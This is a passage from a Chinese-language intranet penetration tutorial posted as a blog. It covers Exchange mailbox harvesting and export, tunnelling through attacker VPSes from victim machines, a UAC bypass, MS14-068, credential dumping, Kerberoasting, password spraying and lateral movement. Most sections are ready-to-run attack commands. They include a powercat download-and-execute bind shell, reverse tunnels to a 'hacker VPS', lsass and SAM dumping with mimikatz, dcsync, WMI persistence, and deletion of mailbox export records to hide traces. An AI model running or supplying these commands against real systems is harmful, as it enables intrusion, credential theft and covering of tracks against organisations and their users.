<p><a target="_blank" rel="noopener" href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml</a></p>
<p>其他如ews接口也存在被暴力破解利用的风险：</p>
<p><a target="_blank" rel="noopener" href="https://mail.targetdomain.com/ews">https://mail.targetdomain.com/ews</a></p>
<h3 id="1-16-2-通讯录收集"><a href="#1-16-2-通讯录收集" class="headerlink" title="1.16.2 通讯录收集"></a>1.16.2 通讯录收集</h3><p>在获取一个邮箱账号密码后，可以使用MailSniper收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p>
<pre class="line-numbers language-none"><code class="language-none">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="1-16-3-信息收集"><a href="#1-16-3-信息收集" class="headerlink" title="1.16.3 信息收集"></a>1.16.3 信息收集</h3><p>当我们拿下exchange服务器后，可以做一些信息收集，包括不限于用户、邮件。</p>
<p>获取所有邮箱用户：</p>
<pre class="line-numbers language-none"><code class="language-none">Get-Mailbox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>导出邮件：</p>
<pre class="line-numbers language-none"><code class="language-none">New-MailboxexportRequest -mailbox username -FilePath (“\localhost\c$\test\username.pst”)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以通过web口导出，登录：</p>
<p><a target="_blank" rel="noopener" href="https://mail.domain.com/ecp/">https://mail.domain.com/ecp/</a></p>
<p>导出后会有记录，用如下命令可以查看：</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除某个导出记录：</p>
<pre class="line-numbers language-none"><code class="language-none">Remove-MailboxExportRequest -Identity ‘username\mailboxexport’ -Confirm:$false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="传输通道"><a href="#传输通道" class="headerlink" title="传输通道"></a>传输通道</h1><p>在做完信息收集后，为了方便进一步内网渗透，一般都会建立一个通道，甚至是多级跳板。</p>
<h2 id="2-1-是否出网"><a href="#2-1-是否出网" class="headerlink" title="2.1 是否出网"></a>2.1 是否出网</h2><p>可以用以下命令判断:</p>
<pre class="line-numbers language-none"><code class="language-none">ping : icmp

curl : http

nslookup : dns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="2-2-netsh"><a href="#2-2-netsh" class="headerlink" title="2.2 netsh"></a>2.2 netsh</h2><p>netsh是windows自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p>
<p>A机器执行如下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">netsh interface portproxy add v4tov4 listenport&#x3D;5555 connectport&#x3D;3389 connectaddress&#x3D;192.168.1.1 protocol&#x3D;tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
<h2 id="2-3-ssh"><a href="#2-3-ssh" class="headerlink" title="2.3 ssh"></a>2.3 ssh</h2><p>ssh一般被拿来登录linux机器，也可以拿来做代理和转发。</p>
<p>a、开启socks代理：</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -qTfnN -D 1111 root@1.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输入1.1.1.1机器密码，本地利用proxychains等类似工具连接本地的1111端口的sock5连接即可代理1.1.1.1的网络。</p>
<p>b、控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C：</p>
<p>A机器执行：</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -CNfg -L 2121:CIP:21 root@BIP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输入BIP机器密码，访问A的2121端口即是访问CIP的21端口。</p>
<p>c、控制A机器，A能够访问B：</p>
<p>A机器执行：</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -CNfg -R 2121:BIP:21 root@hackervps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输入黑客vps密码，访问黑客vps的2121端口即是访问BIP的21端口。</p>
<h2 id="2-4-reGeorg"><a href="#2-4-reGeorg" class="headerlink" title="2.4 reGeorg"></a>2.4 reGeorg</h2><p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，使用http代理进入内网。</p>
<p>根据网站支持的语言，把相应的tunnel.xx传到服务器上，访问tunnel.xx显示“Georg says,<br> ‘All seems fine’”，说明基本ok。</p>
<p>本地运行：</p>
<pre class="line-numbers language-none"><code class="language-none">python reGeorgSocksProxy.py -p 9999 -u http:&#x2F;&#x2F;1.1.1.1:8080&#x2F;tunnel.xx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用proxychains等类似工具连接本地的9999端口的sock5连接即可代理1.1.1.1的网络。</p>
<h2 id="2-5-EarthWorm"><a href="#2-5-EarthWorm" class="headerlink" title="2.5 EarthWorm"></a>2.5 EarthWorm</h2><p>EarthWorm是一款用于开启SOCKS<br> v5代理服务的工具，基于标准C开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</p>
<p>a、受害者机器有外网ip并可直接访问：</p>
<p>把ew传到对方服务器上，执行：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew -s ssocksd -l 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>现在本地利用proxychains等类似工具连接本地的对方服务器的8888端口的sock5连接即可代理对方的网络。</p>
<p>b、控制A机器，A能够访问B，通过A访问B：</p>
<p>在自己外网服务器上执行：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew -s rcsocks -l 1080 -e 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对方服务器执行：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew -s rssocks -d yourvpsip -e 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用proxychains等类似工具可通过连接你的外网vps的1080<br> 端口的socks5，即可代理受害者服务器的网络。</p>
<p>c、控制A、B机器，A能够访问B，B能够访问C，A有外网ip并可直接访问，通过A来使用B的流量访问C：</p>
<p>B机器执行：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew -s ssocksd -l 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>A机器：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew -s lcx_tran -l 1080 -f BIP -g 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用proxychains等类似工具可通过连接A的1080 端口的socks5，即可代理B服务器的网络。</p>
<p>d、控制A、B机器，A能够访问B，B能够访问C，A没有外网ip，通过A连接自己的外网vps来使用B的流量访问C：</p>
<p>自己vps执行：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew -s lcx_listen -l 1080 -e 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>B机器执行：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew -s ssocksd -l 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>A机器执行：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用proxychains等类似工具可通过连接你自己的vps的1080<br> 端口的socks5，即可代理B服务器的网络。</p>
<h2 id="2-6-lcx"><a href="#2-6-lcx" class="headerlink" title="2.6 lcx"></a>2.6 lcx</h2><p>lcx是一款轻便的端口转发工具。</p>
<p>a、反向转发</p>
<p>外网VPS机器监听：</p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -listen 1111 2222<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>受害者机器执行：</p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave VPSip 1111 127.0.0.1 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p>
<p>b、正向转发</p>
<p>A机器执行：</p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 1111 2.2.2.2 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p>
<h2 id="2-7-powercat"><a href="#2-7-powercat" class="headerlink" title="2.7 powercat"></a>2.7 powercat</h2><p>powercat是一款ps版nc。可以本地执行，也可以远程下载执行，远程执行命令如下：</p>
<pre class="line-numbers language-none"><code class="language-none">powershell “IEX (New-Object
System.Net.Webclient).DownloadString(‘https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat
-l -p 8000 -e cmd”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后远程连接执行命令即可。如果嫌弃该命令太暴露，可以对其进行编码。</p>
<h2 id="2-8-mssql"><a href="#2-8-mssql" class="headerlink" title="2.8 mssql"></a>2.8 mssql</h2><p>当目标机器只开放mssql时，我们也可以利用mssql执行clr作为传输通道。</p>
<p>环境如下：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010923206.png"></p>
<p>工具项目地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a></p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>明明是administrator权限，为什么有些命令执行不了？拿到一个普通的域用户权限后，如何拿到域控权限？继续往下看。</p>
<h2 id="3-1-UAC"><a href="#3-1-UAC" class="headerlink" title="3.1 UAC"></a>3.1 UAC</h2><p>UAC，即用户账户控制，其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序损坏系统的效果。在系统上直观看起来类似于这样：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010923863.png">    </p>
<p>那如何寻找bypass<br> uac的方法呢。我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass<br> uac的效果。</p>
<p>以高权限运行的进程图标一般有如下标志：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010923548.png">    </p>
<p>我们win10以ComputerDefaults.exe作为bypass案例，ComputerDefaults.exe进程图标确实有个uac的标志（然后你双击打开会发现并没有uac提醒），</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010924181.png">    </p>
<p>我们利用ProcessMonitor对该进程的行为做一个监听：</p>
<p>先寻找HKCU:\Software\Classes\ms-settings\Shell\Open\Command<br>注册表，然后发现键值不存在，再寻找HKCR:\ms-settings\Shell\Open\Command\DelegateExecute</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010924284.png"></p>
<p>因此当我们修改hkcu注册表后，运行ComputerDefaults.exe就会得到一个bypass<br>uac后的cmd：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010924179.png"></p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010924311.png"></p>
<p>对了，当修改HKCU\Software\Classes\下的键值时，会同步修改HKCR下面的键值。</p>
<h2 id="3-2-ms14-068"><a href="#3-2-ms14-068" class="headerlink" title="3.2 ms14-068"></a>3.2 ms14-068</h2><p>该漏洞可以在只有一个普通域用户的权限时，获取到域控权限。微软已经修复了该漏洞，对应的补丁号为kb3011780。下面介绍下漏洞的成因，先来一个Kerberos协议流程图：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010925094.png"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1515">https://adsecurity.org/?p=1515</a></p>
<p>大致流程如下：</p>
<p>1、域用户登录时，向KDC的AS服务以自身密码加密的时间戳进行预认证；</p>
<p>2、域控的AS服务验证用户的密码是否正确。验证通过后，返回给用户一张TGT票据，该票据为krbtgt密码加密而成；</p>
<p>3、域用户拿着TGT向KDC的TGS服务申请访问Application Server的票据</p>
<p>4、域控的TGS服务验证TGT通过后，返回给域用户能够访问Application<br> Server的票据，即ST，ST以Application Server的服务账号密码加密；</p>
<p>5、域用户拿着ST访问对应的Application Server；</p>
<p>6、Application Server验证ST，决定成功与否。</p>
<p>下面简述ms14-068的问题所在：</p>
<p>TGT中作为用户凭证，包含了用户名、用户id、所属组等信息，即PAC。简单点讲，PAC就是验证用户所拥有权限的特权属性证书。</p>
<p>默认PAC是包含在TGT中的，而出现ms14-068这个问题的原因在于用户在申请TGT时可以要求KDC返回的TGT不包含PAC（include-PAC为false），然后用户自己构造PAC并放入TGS_REQ数据包中的REQ_BODY中，KDC会解密PAC并加密到一个新的TGT中（正常应该返回一个ST）并返回给用户，此时这个TGT已经带入了我们构造的恶意的PAC。后面就是正常的kerberos流程了。</p>
<p>利用方法：</p>
<pre class="line-numbers language-none"><code class="language-none">python ms14-068.py -u @\ -s \ -d \ mimikatz.exe “kerberos::ptc TGT_user@domain.ccache” exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以使用goldenPac.py来达到ms14-068+psexec的自动化利用：</p>
<pre class="line-numbers language-none"><code class="language-none">goldenPac.py domain.com&#x2F;username:password@dc.domain.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h1><p>密码抓取已经成为渗透中必不可少的一项技能。一个管理员很可能管理着N多台机器，但是密码使用的都是同一个或者是有规律的。如果抓到一台机器的密码，利用同密码碰撞，很可能这个渗透项目就结束了。本节主要介绍密码抓取的原理和一些手段。</p>
<h2 id="4-1-ntlmhash和net-ntlmhash"><a href="#4-1-ntlmhash和net-ntlmhash" class="headerlink" title="4.1 ntlmhash和net-ntlmhash"></a>4.1 ntlmhash和net-ntlmhash</h2><p>先简单介绍下lmhash和ntlmhash。</p>
<p>我们经常看到的hash长这样：</p>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
<p>他的组成就是:</p>
<p>user:sid:lmhash:ntlmhash</p>
<p>lmhash的加密流程如下：</p>
<p>1、密码长度限制为14个字符</p>
<p>2、密码全部转换为大写</p>
<p>3、密码转换为16进制字符串，不足14字节用0补全</p>
<p>4、密码的16进制字符串被分成两个7byte部分</p>
<p>5、再分7bit为一组,每组末尾加0，再组成一组</p>
<p>6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p>
<p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p>
<p>为了解决lmhash强度不够的问题，微软推出了ntlmhash：</p>
<p>1、先将用户密码转换为十六进制格式。</p>
<p>2、将十六进制格式的密码进行Unicode编码。</p>
<p>3、使用MD4对Unicode编码数据进行Hash计算</p>
<p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是aad3b435b51404eeaad3b435b51404ee</p>
<p>在hash传递攻击时，可以替换成0：</p>
<p>00000000000000000000000000000000</p>
<p>再看下ntlm认证的过程：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010925794.png">    </p>
<p>他的简述流程如下：</p>
<p>1、客户端向服务端发起认证</p>
<p>2、服务器收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。并使用登录用户密码hash加密Challenge，获得Challenge1</p>
<p>3、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</p>
<p>4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功。</p>
<p>上述中的response类似于下面这样：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010926821.png"></p>
<p>上述中的response就可以理解为net-ntlmhash，因此ntlmhash我们是可以拿来hash传递的，而net-ntlmhash不可以，但是net-ntlmhash也可以拿来做破解和relay。</p>
<h2 id="4-2-本地用户凭据"><a href="#4-2-本地用户凭据" class="headerlink" title="4.2 本地用户凭据"></a>4.2 本地用户凭据</h2><p>在windows上，C:\Windows\System32\config目录保存着当前用户的密码hash。我们可以使用相关手段获取该hash。</p>
<p>使用reg命令获取本地用户凭据hash：</p>
<pre class="line-numbers language-none"><code class="language-none">reg save hklm\sam sam.hive reg save hklm\system system.hive reg save hklm\security security.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后利用bootkey解密获取hash。</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010926486.png"></p>
<p>其他一些工具同理，比如</p>
<p>pwdump7:</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010926222.png"></p>
<p>mimikatz：</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug token::elevate lsadump::sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010926321.png"></p>
<p>当然，从lsass.exe中获取也可以。如直接使用mimikatz获取：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010927834.png"></p>
<p>Procdump+Mimikatz：</p>
<pre class="line-numbers language-none"><code class="language-none">procdump64.exe -accepteula -ma lsass.exe lsass.dmp mimikatz.exe “sekurlsa::minidump lsass.dmp”
“sekurlsa::logonPasswords full” exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>而为什么有的抓不到明文密码，主要还是kb2871997的问题。kb2871997补丁会删除除了wdigest<br> ssp以外其他ssp的明文凭据，但对于wdigest<br> ssp只能选择禁用。用户可以选择将HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential更改为0来禁用。</p>
<p>它在winserver 2012 R2及以上版本已默认集成。在winserver 2012<br> R2上面测试，手动添加上述注册表的值为1，然后抓密码，发现只有wdigest能抓到明文密码了：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010927303.png">    </p>
<p>再提一下kb2871997补丁问题，除了“解决”上述明文密码问题，还“解决”了pth问题，但是kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名)和本地管理员组的域用户是没有影响的。</p>
<h2 id="4-3-域hash"><a href="#4-3-域hash" class="headerlink" title="4.3 域hash"></a>4.3 域hash</h2><p>当拿到域控权限时，可以从域控中的C:\Windows\NTDS\NTDS.dit导出所有用户hash。因为ntds.dit被占用，因此需要利用如卷影备份等手段copy出ntds.dit，然后利用如NTDSDumpEx.exe解析hash：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010927151.png"></p>
<p>当拷贝ntds.dit时，由于网络、文件大小等问题，可以使用DRS协议获取hash凭据：</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug “lsadump::dcsync &#x2F;domain:jumbolab.com &#x2F;all &#x2F;csv” exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010928366.png"></p>
<p>有时为什么能抓到明文密码，有时并不能呢，除了上面说的kb2871997的问题以外，还有个“Reversible<br> Encryption”。</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010928421.png"></p>
<h2 id="4-4-token窃取"><a href="#4-4-token窃取" class="headerlink" title="4.4 token窃取"></a>4.4 token窃取</h2><p>token是一个描述进程或线程安全上下文的对象。token即令牌包括了与进程或线程关联的用户账号的标识和特权，当用户登录时，系统通过将用户密码与安全数据库进行比对来验证用户密码正确性，如果密码正确，系统将生成访问token。该用户的进程都携带该token，可以利用DuplicateTokenEx<br> api对现有token的复制，然后使用CreateProcessWithToken<br> api对复制的token创建一个新的进程。效果如下：</p>
<p>有个system权限进程：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010928247.png"></p>
<p>以administrator权限窃取该进程token，成功获取system权限：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010928199.png"></p>
<p>当然，降权也可以使用上述方法。</p>
<h2 id="4-5-Kerberoasting"><a href="#4-5-Kerberoasting" class="headerlink" title="4.5 Kerberoasting"></a>4.5 Kerberoasting</h2><p>在KRB_TGS_REP中，TGS会返回给Client一张票据ST，而ST是由Client请求的Server端密码进行加密的。当Kerberos协议设置票据为RC4方式加密时，我们就可以通过爆破在Client端获取的票据ST，从而获得Server端的密码。</p>
<p>在上述SPN信息收集中得到一个域用户test注册了一个SPN，我们请求TGS：</p>
<pre class="line-numbers language-none"><code class="language-none">powershell$SPNName &#x3D; &#39;test&#x2F;test&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010929585.png"></p>
<p>再利用mimikatz导出：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010929225.png"></p>
<p>然后利用<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">tgsrepcrack</a>暴力破解：</p>
<pre class="line-numbers language-none"><code class="language-none">python tgsrepcrack.py wordlist.txt 2-40a10000-win7user@test~test-JUMBOLAB.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最终成功获取该域用户密码：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010929499.png"></p>
<h2 id="4-6-密码喷射"><a href="#4-6-密码喷射" class="headerlink" title="4.6 密码喷射"></a>4.6 密码喷射</h2><p>弱口令，永远改不完。在内网中，也可以尝试对smb、3389、mssql弱口令进行密码暴力破解，但是要注意线程，密码数不要太多。当然，也可以使用不同账号，同个密码进行尝试。这里使用kerbrute对域用户/密码进行暴力破解：</p>
<p>爆破用户：</p>
<pre class="line-numbers language-none"><code class="language-none">kerbrute userenum -d jumbolab.com usernames.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010929258.png"></p>
<p>密码喷射:</p>
<pre class="line-numbers language-none"><code class="language-none">kerbrute passwordspray -d jumbolab.com username.txt aA1234567<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010930782.png"></p>
<h2 id="4-7-LAPS"><a href="#4-7-LAPS" class="headerlink" title="4.7 LAPS"></a>4.7 LAPS</h2><p>Local Administrator Password<br> Solution是密码解决方案，为了防止一台机器被抓到密码后，然后网内都是同密码机器导致被横向渗透。但是也存在相应的安全隐患，当我们拿下域控时，可以查看计算机本地密码;当权限配置不当时，也会导致其他用户有权限查看他人计算机本地密码：</p>
<pre class="line-numbers language-none"><code class="language-none">powershell Get-ADComputer computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果安装LAPS，在安装的软件列表里能看到：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010930536.png"></p>
<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>当我们获取到某个机器账号密码、获取到hash了，后续我们应该怎么做，如何做，这就是本章介绍的内容。当然，当我们拿下更多的机器时，别忘记了，信息收集必不可少。</p>
<h2 id="5-1-账号密码连接"><a href="#5-1-账号密码连接" class="headerlink" title="5.1 账号密码连接"></a>5.1 账号密码连接</h2><p>当我们获取到机器的账号密码的时候，可以尝试用以下几种方式进行连接并执行命令。</p>
<p>a、IPC</p>
<pre class="line-numbers language-none"><code class="language-none">net use \1.1.1.1\ipc$ “password” &#x2F;user:username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>b、Psexec</p>
<pre class="line-numbers language-none"><code class="language-none">用服务启动的方式： psexec \target -accepteula -u username -p password cmd.exe psexec.py jumbolab.com&#x2F;administrator@172.16.127.184<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>c、WMI</p>
<pre class="line-numbers language-none"><code class="language-none">方法一 wmic &#x2F;user:”jumbolab.com\win7user” &#x2F;password:”password” &#x2F;node:172.16.127.184 process call create “notepad”

方法二 Invoke-WmiMethod -class win32_process -name create -argumentlist ‘notepad’ -ComputerName 172.16.127.184 -Credential ‘jumbolab.com\win7user’

方法三$filterName &#x3D; &#39;BotFilter82&#39;$consumerName &#x3D; &#39;BotConsumer23&#39;$exePath &#x3D; &#39;C:\Windows\System32\notepad.exe&#39;$Query &#x3D; &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;$WMIEventFilter &#x3D; Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name&#x3D;$filterName;EventNameSpace&#x3D;&quot;root\cimv2&quot;;QueryLanguage&#x3D;&quot;WQL&quot;;Query&#x3D;$Query&#125; -ErrorAction Stop -ComputerName 172.16.127.184 -Credential &#39;jumbolab.com\win7user&#39;$WMIEventConsumer &#x3D; Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name&#x3D;$consumerName;ExecutablePath&#x3D;$exePath;CommandLineTemplate&#x3D;$exePath&#125;  -ComputerName 172.16.127.184 -Credential &#39;jumbolab.com\win7user&#39;Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter&#x3D;$WMIEventFilter;Consumer&#x3D;$WMIEventConsumer&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>d、Schtasks</p>
<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;create &#x2F;s 1.1.1.1 &#x2F;u domain\Administrator &#x2F;p password &#x2F;ru “SYSTEM” &#x2F;tn “windowsupdate” &#x2F;sc DAILY &#x2F;tr “calc” &#x2F;F schtasks &#x2F;run &#x2F;s 1.1.1.1 &#x2F;u domain\Administrator &#x2F;p password &#x2F;tn windowsupdate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>e、AT</p>
<pre class="line-numbers language-none"><code class="language-none">at \1.1.1.1 15:15 calc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>f、SC</p>
<pre class="line-numbers language-none"><code class="language-none">sc \1.1.1.1 create windowsupdate binpath&#x3D; “calc” sc \1.1.1.1 start windowsupdate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>g、REG</p>
<pre class="line-numbers language-none"><code class="language-none">reg add \1.1.1.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run &#x2F;v myentry &#x2F;t REG_SZ &#x2F;d “calc”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>h、DCOM</p>
<pre class="line-numbers language-none"><code class="language-none">方法一$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;1.1.1.1&quot;))$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)

方法二$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;1.1.1.1&quot;)$obj &#x3D; [System.Activator]::CreateInstance($com)$item &#x3D; $obj.item()$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)

方法三$com &#x3D; [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;1.1.1.1&quot;)$obj &#x3D; [System.Activator]::CreateInstance($com)$obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>i、WINRM</p>
<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;1.1.1.1:5985 -u:Administrator -p:password “whoami” winrs -r:http:&#x2F;&#x2F;dcserver.jumbolab.com:5985 -u:jumbolab\administrator -p:password “whoami “<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010930373.png" alt="img"></p>
<h2 id="5-2-PTH"><a href="#5-2-PTH" class="headerlink" title="5.2 PTH"></a>5.2 PTH</h2><p>当我们没有明文账号密码，只有hash时，可以尝试hash传递。</p>
<h3 id="5-2-1-impacket套件"><a href="#5-2-1-impacket套件" class="headerlink" title="5.2.1 impacket套件"></a>5.2.1 impacket套件</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
